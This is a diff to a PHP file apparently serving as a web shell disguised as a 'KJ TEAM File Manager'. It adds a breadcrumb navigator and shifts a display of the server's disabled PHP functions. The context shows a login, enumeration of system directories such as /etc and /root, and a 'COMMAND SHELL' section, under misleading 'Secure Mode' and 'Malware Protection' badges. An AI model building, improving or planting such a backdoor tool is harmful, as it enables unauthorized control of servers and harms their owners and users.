@@ -201,22 +201,68 @@ function getDirectoryTree($path, $depth = 2, $maxItems = 50) {
 function getDriveList() {
     $drives = [];
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        // Windows - cek drive A-Z
-        for ($i = 67; $i <= 90; $i++) { // C: sampai Z:
+        for ($i = 67; $i <= 90; $i++) {
             $drive = chr($i) . ':';
             if (is_dir($drive . '\\')) {
                 $drives[] = $drive;
             }
         }
-        // Tambahan: cek drive lain
         if (empty($drives)) {
             $drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:'];
         }
     } else {
-        // Linux/Unix
         $drives = ['/', '/home', '/var', '/tmp', '/usr', '/etc', '/opt', '/root'];
     }
     return $drives;
+}
+
+// ============ BREADCRUMB NAVIGATOR ============
+function buildBreadcrumb($path) {
+    $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+    
+    // Split path
+    if ($isWindows) {
+        $parts = explode('\\', $path);
+        // Untuk Windows, tambahkan drive di awal
+        if (strpos($path, ':') !== false) {
+            $drive = $parts[0];
+            $parts = array_filter($parts);
+        }
+    } else {
+        $parts = explode('/', $path);
+        $parts = array_filter($parts);
+    }
+    
+    $breadcrumb = [];
+    $currentPath = '';
+    
+    if ($isWindows && isset($drive)) {
+        $currentPath = $drive . '\\';
+        $breadcrumb[] = [
+            'name' => $drive,
+            'path' => $drive . '\\',
+            'isRoot' => true
+        ];
+    } else {
+        $breadcrumb[] = [
+            'name' => '/',
+            'path' => '/',
+            'isRoot' => true
+        ];
+        $currentPath = '/';
+    }
+    
+    foreach ($parts as $part) {
+        if ($part === '') continue;
+        $currentPath .= $part . ($isWindows ? '\\' : '/');
+        $breadcrumb[] = [
+            'name' => $part,
+            'path' => $currentPath,
+            'isRoot' => false
+        ];
+    }
+    
+    return $breadcrumb;
 }
 
 // ============ LOGIN ============
@@ -635,6 +681,9 @@ foreach ($allItems as $item) {
         $allFiles[] = $item;
 }
 
+// ============ GET BREADCRUMB ============
+$breadcrumb = buildBreadcrumb($currentPath);
+
 // ============ GET DIRECTORY TREE ============
 $drives = getDriveList();
 $dirTree = getDirectoryTree($currentPath, 2, 30);
@@ -646,7 +695,7 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kj TEAM File Manager</title>
+    <title>KJ TEAM File Manager</title>
     <style>
         @import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
         * {
@@ -696,6 +745,74 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
         .badge-safe { background: #1a3a2a; color: #4aef4a; border-color: #4a7a4a; }
         .badge-warn { background: #3a3a1a; color: #efef4a; border-color: #7a7a4a; }
         .badge-danger { background: #3a1a1a; color: #ef4a4a; border-color: #7a4a4a; }
+        
+        /* ============ BREADCRUMB NAVIGATOR ============ */
+        .breadcrumb-nav {
+            background: #0a0e27;
+            border: 1px solid #2d4a7a;
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px;
+        }
+        .breadcrumb-nav .home-icon {
+            color: #4a9eff;
+            font-size: 18px;
+            margin-right: 5px;
+        }
+        .breadcrumb-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .breadcrumb-item a {
+            color: #88ccff;
+            text-decoration: none;
+            padding: 4px 10px;
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-size: 13px;
+            background: #0d1117;
+            border: 1px solid transparent;
+        }
+        .breadcrumb-item a:hover {
+            color: #ffffff;
+            background: #1a3a6a;
+            border-color: #4a9eff;
+            box-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
+            transform: translateY(-1px);
+        }
+        .breadcrumb-item a.current {
+            color: #4a9eff;
+            background: #1a2a4a;
+            border-color: #2d4a7a;
+            cursor: default;
+        }
+        .breadcrumb-item a.current:hover {
+            transform: none;
+            box-shadow: none;
+        }
+        .breadcrumb-separator {
+            color: #2d4a7a;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .breadcrumb-path-full {
+            color: #6c8cba;
+            font-size: 11px;
+            margin-left: auto;
+            background: #0d1117;
+            padding: 3px 10px;
+            border-radius: 5px;
+            border: 1px solid #1a2a4a;
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
         
         .nav-bar {
             background: #0d1117;
@@ -843,7 +960,6 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
         .mt-10 { margin-top: 10px; }
         .mb-10 { margin-bottom: 10px; }
         
-        /* Directory Navigator Styles */
         .dir-navigator {
             background: #0a0e27;
             border: 1px solid #2d4a7a;
@@ -899,20 +1015,13 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
             gap: 5px;
             margin-bottom: 10px;
         }
-        .path-display {
-            background: #0a0e27;
-            padding: 8px 12px;
-            border-radius: 5px;
-            border: 1px solid #2d4a7a;
-            color: #4a9eff;
-            font-size: 13px;
-            word-break: break-all;
-        }
         
         @media (max-width: 768px) {
             body { padding: 10px; }
             table { font-size: 12px; }
             td { display: block; width: 100%; }
+            .breadcrumb-path-full { display: none; }
+            .breadcrumb-item a { font-size: 11px; padding: 3px 6px; }
         }
     </style>
     <script>
@@ -934,7 +1043,7 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
     <!-- HEADER -->
     <div class="header">
         <img src="https://i.ibb.co/Df8g5PYb/kj.png" alt="Kj TEAM">
-        <h1>⚡ Kj TEAM FILE MANAGER</h1>
+        <h1>KK TEAM FILE MANAGER</h1>
         <div>
             <span class="badge badge-safe">🔒 Secure Mode</span>
             <span class="badge badge-safe">🛡️ Malware Protection</span>
@@ -956,30 +1065,45 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
         <div class="alert <?php echo $messageType; ?>"><?php echo $message; ?></div>
     <?php endif; ?>
 
+    <!-- ============ BREADCRUMB NAVIGATOR ============ -->
+    <div class="breadcrumb-nav">
+        <span class="home-icon">🏠</span>
+        <?php foreach ($breadcrumb as $index => $item): ?>
+            <div class="breadcrumb-item">
+                <?php if ($index > 0): ?>
+                    <span class="breadcrumb-separator">›</span>
+                <?php endif; ?>
+                <?php if ($index === count($breadcrumb) - 1): ?>
+                    <a href="#" class="current"><?php echo x($item['name']); ?></a>
+                <?php else: ?>
+                    <a href="?d=<?php echo urlencode($item['path']); ?>"><?php echo x($item['name']); ?></a>
+                <?php endif; ?>
+            </div>
+        <?php endforeach; ?>
+        <span class="breadcrumb-path-full" title="<?php echo x($currentPath); ?>">
+            📍 <?php echo x($currentPath); ?>
+        </span>
+    </div>
+
+    <!-- DISABLE FUNCTIONS INFO -->
+    <?php
+    $disabled = ini_get('disable_functions');
+    if (!empty($disabled)) {
+        echo "<div class='alert info'>⚠️ Fungsi yang diblokir: <strong>$disabled</strong></div>";
+    }
+    ?>
+
     <!-- DIRECTORY NAVIGATOR -->
     <div class="section-box">
-        <h3>📂 Directory Navigator</h3>
+        <h3>📂 Quick Navigation</h3>
         
-        <!-- Current Path Display -->
-        <div class="path-display mb-10">
-            📍 <strong>Current Path:</strong> <?php echo x($currentPath); ?>
-        </div>
-        
-        <!-- Drive List (Windows) atau Root Directories (Linux) -->
+        <!-- Drive List -->
         <div class="drive-list">
             <?php foreach ($drives as $drive): ?>
                 <button onclick="goToDrive('<?php echo $drive; ?>')" class="btn-drive <?php echo (strpos($currentPath, $drive) === 0) ? 'active' : ''; ?>">
                     💾 <?php echo $drive; ?>
                 </button>
             <?php endforeach; ?>
-            <button onclick="navigateTo('/')" class="btn-drive">🏠 /</button>
-            <button onclick="navigateTo('/home')" class="btn-drive">🏠 /home</button>
-            <button onclick="navigateTo('/var')" class="btn-drive">📁 /var</button>
-            <button onclick="navigateTo('/tmp')" class="btn-drive">📁 /tmp</button>
-            <button onclick="navigateTo('/usr')" class="btn-drive">📁 /usr</button>
-            <button onclick="navigateTo('/etc')" class="btn-drive">📁 /etc</button>
-            <button onclick="navigateTo('/opt')" class="btn-drive">📁 /opt</button>
-            <button onclick="navigateTo('/root')" class="btn-drive">🔒 /root</button>
         </div>
         
         <!-- Directory Tree -->
@@ -989,7 +1113,7 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
                     <div class="dir-item">
                         <span class="icon">📁</span>
                         <a href="?d=<?php echo urlencode($dir['path']); ?>" class="name"><?php echo x($dir['name']); ?></a>
-                        <span class="size">click to open</span>
+                        <span class="size">↗ click</span>
                     </div>
                 <?php endforeach; ?>
             <?php else: ?>
@@ -1007,14 +1131,6 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
             </form>
         </div>
     </div>
-
-    <!-- DISABLE FUNCTIONS INFO -->
-    <?php
-    $disabled = ini_get('disable_functions');
-    if (!empty($disabled)) {
-        echo "<div class='alert info'>⚠️ Fungsi yang diblokir: <strong>$disabled</strong></div>";
-    }
-    ?>
 
     <!-- COMMAND SHELL -->
     <div class="section-box">
